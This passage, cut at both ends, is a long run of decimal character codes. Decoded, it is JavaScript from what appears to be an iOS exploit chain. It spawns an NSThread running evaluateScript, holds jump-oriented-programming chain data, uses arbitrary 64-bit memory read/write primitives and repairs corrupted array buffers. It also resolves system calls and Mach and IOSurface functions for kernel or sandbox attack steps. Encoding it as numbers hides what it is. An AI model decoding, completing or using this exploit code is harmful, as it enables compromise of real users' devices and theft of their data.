110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 40, 105, 110, 118, 111, 107, 101, 95, 99, 108, 97, 115, 115, 44, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 115, 105, 103, 110, 97, 116, 117, 114, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 41, 44, 32, 49, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 99, 116, 120, 41, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 44, 32, 50, 110, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 32, 61, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 40, 110, 115, 116, 104, 114, 101, 97, 100, 95, 99, 108, 97, 115, 115, 41, 59, 10, 32, 32, 32, 32, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 40, 110, 115, 116, 104, 114, 101, 97, 100, 44, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 107, 101, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 40, 110, 115, 116, 104, 114, 101, 97, 100, 41, 59, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 116, 104, 114, 101, 97, 100, 95, 104, 97, 110, 100, 108, 101, 34, 32, 58, 32, 110, 115, 116, 104, 114, 101, 97, 100, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 95, 99, 116, 120, 34, 32, 58, 32, 99, 116, 120, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 34, 32, 58, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 34, 32, 58, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 125, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 40, 106, 115, 95, 116, 104, 114, 101, 97, 100, 41, 10, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 95, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 115, 95, 99, 116, 120, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 116, 104, 114, 101, 97, 100, 95, 104, 97, 110, 100, 108, 101, 34, 93, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 119, 97, 105, 116, 32, 117, 110, 116, 105, 108, 32, 116, 104, 101, 32, 116, 104, 114, 101, 97, 100, 32, 105, 115, 32, 102, 105, 110, 105, 115, 104, 101, 100, 32, 97, 110, 100, 32, 114, 101, 108, 101, 97, 115, 101, 32, 105, 116, 10, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 116, 114, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 61, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 110, 115, 116, 104, 114, 101, 97, 100, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 61, 61, 32, 49, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 98, 114, 101, 97, 107, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 110, 115, 116, 104, 114, 101, 97, 100, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 118, 101, 114, 116, 32, 114, 119, 54, 52, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 118, 101, 114, 116, 32, 114, 119, 56, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 108, 101, 97, 115, 101, 32, 106, 115, 32, 99, 111, 110, 116, 101, 120, 116, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 99, 95, 114, 101, 102, 95, 99, 111, 117, 110, 116, 32, 61, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 40, 106, 115, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 102, 111, 114, 32, 40, 108, 101, 116, 32, 105, 32, 61, 32, 48, 110, 59, 32, 105, 32, 60, 32, 106, 115, 99, 95, 114, 101, 102, 95, 99, 111, 117, 110, 116, 59, 32, 105, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 106, 115, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 108, 101, 97, 115, 101, 32, 116, 97, 114, 103, 101, 116, 32, 106, 115, 32, 115, 99, 114, 105, 112, 116, 10, 32, 32, 32, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 102, 114, 101, 101, 32, 106, 111, 112, 32, 99, 104, 97, 105, 110, 32, 112, 114, 111, 112, 101, 114, 116, 105, 101, 115, 10, 32, 32, 32, 32, 102, 114, 101, 101, 40, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 93, 41, 59, 10, 125, 10, 108, 101, 116, 32, 82, 84, 76, 68, 95, 68, 69, 70, 65, 85, 76, 84, 32, 61, 32, 48, 120, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 69, 110, 59, 10, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 65, 78, 89, 87, 72, 69, 82, 69, 32, 61, 32, 49, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 70, 73, 88, 69, 68, 32, 61, 32, 48, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 79, 86, 69, 82, 87, 82, 73, 84, 69, 32, 61, 32, 48, 120, 52, 48, 48, 48, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 82, 65, 78, 68, 79, 77, 95, 65, 68, 68, 82, 32, 61, 32, 56, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 73, 78, 72, 69, 82, 73, 84, 95, 78, 79, 78, 69, 32, 61, 32, 50, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 32, 61, 32, 51, 110, 59, 10, 10, 108, 101, 116, 32, 80, 82, 79, 84, 95, 82, 69, 65, 68, 32, 61, 32, 48, 120, 49, 110, 59, 10, 108, 101, 116, 32, 80, 82, 79, 84, 95, 87, 82, 73, 84, 69, 32, 61, 32, 48, 120, 50, 110, 59, 10, 10, 108, 101, 116, 32, 77, 65, 80, 95, 83, 72, 65, 82, 69, 68, 32, 61, 32, 48, 120, 49, 110, 59, 10, 10, 108, 101, 116, 32, 65, 70, 95, 73, 78, 69, 84, 54, 32, 61, 32, 51, 48, 110, 59, 10, 108, 101, 116, 32, 83, 79, 67, 75, 95, 68, 71, 82, 65, 77, 32, 61, 32, 50, 110, 59, 10, 108, 101, 116, 32, 73, 80, 80, 82, 79, 84, 79, 95, 73, 67, 77, 80, 86, 54, 32, 61, 32, 53, 56, 110, 59, 10, 108, 101, 116, 32, 73, 67, 77, 80, 54, 95, 70, 73, 76, 84, 69, 82, 32, 61, 32, 49, 56, 110, 59, 10, 10, 108, 101, 116, 32, 83, 69, 69, 75, 95, 83, 69, 84, 32, 61, 32, 48, 110, 59, 10, 10, 108, 101, 116, 32, 95, 78, 83, 71, 69, 84, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 80, 65, 84, 72, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 95, 78, 83, 71, 101, 116, 69, 120, 101, 99, 117, 116, 97, 98, 108, 101, 80, 97, 116, 104, 34, 41, 59, 10, 108, 101, 116, 32, 65, 67, 67, 69, 83, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 97, 99, 99, 101, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 67, 79, 78, 70, 83, 84, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 111, 110, 102, 115, 116, 114, 34, 41, 59, 10, 108, 101, 116, 32, 70, 67, 78, 84, 76, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 99, 110, 116, 108, 34, 41, 59, 10, 108, 101, 116, 32, 70, 83, 89, 78, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 115, 121, 110, 99, 34, 41, 59, 10, 108, 101, 116, 32, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 70, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 102, 100, 34, 41, 59, 10, 108, 101, 116, 32, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 80, 79, 82, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 112, 111, 114, 116, 34, 41, 59, 10, 108, 101, 116, 32, 70, 79, 80, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 111, 112, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 70, 67, 76, 79, 83, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 99, 108, 111, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 70, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 83, 79, 67, 75, 79, 80, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 115, 111, 99, 107, 111, 112, 116, 34, 41, 59, 10, 108, 101, 116, 32, 76, 83, 69, 69, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 108, 115, 101, 101, 107, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 77, 69, 77, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 109, 101, 109, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 83, 69, 84, 95, 80, 65, 84, 84, 69, 82, 78, 56, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 115, 101, 116, 95, 112, 97, 116, 116, 101, 114, 110, 56, 34, 41, 59, 10, 108, 101, 116, 32, 79, 80, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 112, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 69, 65, 68, 86, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 101, 97, 100, 118, 34, 41, 59, 10, 108, 101, 116, 32, 80, 87, 82, 73, 84, 69, 86, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 119, 114, 105, 116, 101, 118, 34, 41, 59, 10, 108, 101, 116, 32, 80, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 69, 65, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 101, 97, 100, 34, 41, 59, 10, 108, 101, 116, 32, 82, 69, 65, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 114, 101, 97, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 69, 84, 83, 79, 67, 75, 79, 80, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 101, 116, 115, 111, 99, 107, 111, 112, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 79, 67, 75, 69, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 111, 99, 107, 101, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 65, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 97, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 83, 84, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 115, 116, 114, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 76, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 108, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 78, 67, 77, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 110, 99, 109, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 82, 67, 72, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 114, 99, 104, 114, 34, 41, 59, 10, 108, 101, 116, 32, 80, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 34, 41, 59, 10, 108, 101, 116, 32, 80, 84, 72, 82, 69, 65, 68, 95, 74, 79, 73, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 34, 41, 59, 10, 108, 101, 116, 32, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 82, 69, 77, 79, 86, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 114, 101, 109, 111, 118, 101, 34, 41, 59, 10, 108, 101, 116, 32, 65, 82, 67, 52, 82, 65, 78, 68, 79, 77, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 97, 114, 99, 52, 114, 97, 110, 100, 111, 109, 34, 41, 59, 10, 108, 101, 116, 32, 84, 65, 83, 75, 95, 84, 72, 82, 69, 65, 68, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 116, 97, 115, 107, 95, 116, 104, 114, 101, 97, 100, 115, 34, 41, 59, 10, 108, 101, 116, 32, 84, 72, 82, 69, 65, 68, 95, 83, 85, 83, 80, 69, 78, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 116, 104, 114, 101, 97, 100, 95, 115, 117, 115, 112, 101, 110, 100, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 77, 65, 75, 69, 95, 77, 69, 77, 79, 82, 89, 95, 69, 78, 84, 82, 89, 95, 54, 52, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 109, 97, 107, 101, 95, 109, 101, 109, 111, 114, 121, 95, 101, 110, 116, 114, 121, 95, 54, 52, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 77, 65, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 34, 41, 59, 10, 108, 101, 116, 32, 77, 77, 65, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 109, 97, 112, 34, 41, 59, 10, 108, 101, 116, 32, 77, 76, 79, 67, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 108, 111, 99, 107, 34, 41, 59, 10, 108, 101, 116, 32, 77, 85, 78, 76, 79, 67, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 117, 110, 108, 111, 99, 107, 34, 41, 59, 10, 108, 101, 116, 32, 85, 78, 65, 77, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 117, 110, 97, 109, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 67, 82, 69, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 67, 114, 101, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 80, 82, 69, 70, 69, 84, 67, 72, 80, 65, 71, 69, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 80, 114, 101, 102, 101, 116, 99, 104, 80, 97, 103, 101, 115, 34, 41, 59, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 71, 69, 84, 66, 65, 83, 69, 65, 68, 68, 82, 69, 83, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 71, 101, 116, 66, 97, 115, 101, 65, 100, 100, 114, 101, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 107, 73, 79, 83, 117, 114, 102, 97, 99, 101, 65, 108, 108, 111, 99, 83, 105, 122, 101, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 73, 79, 83, 117, 114, 102, 97, 99, 101, 65, 108, 108, 111, 99, 83, 105, 122, 101, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 68, 85, 77, 80, 40, 97, 100, 100, 114, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 47, 47, 32, 102, 99, 97, 108, 108, 40, 108, 111, 99, 97, 108, 95, 100, 117, 109, 112, 44, 32, 97, 100, 100, 114, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 109, 97, 108, 108, 111, 99, 40, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 98, 117, 102, 102, 32, 61, 32, 110, 101, 119, 32, 85, 105, 110, 116, 56, 65, 114, 114, 97, 121, 40, 66, 105, 103, 73, 110, 116, 40, 115, 122, 41, 46, 97, 115, 73, 110, 116, 51, 50, 115, 41, 46, 102, 105, 108, 108, 40, 48, 120, 48, 48, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 117, 114, 101, 97, 100, 54, 52, 40, 109, 101, 109, 46, 97, 100, 100, 114, 111, 102, 40, 98, 117, 102, 102, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 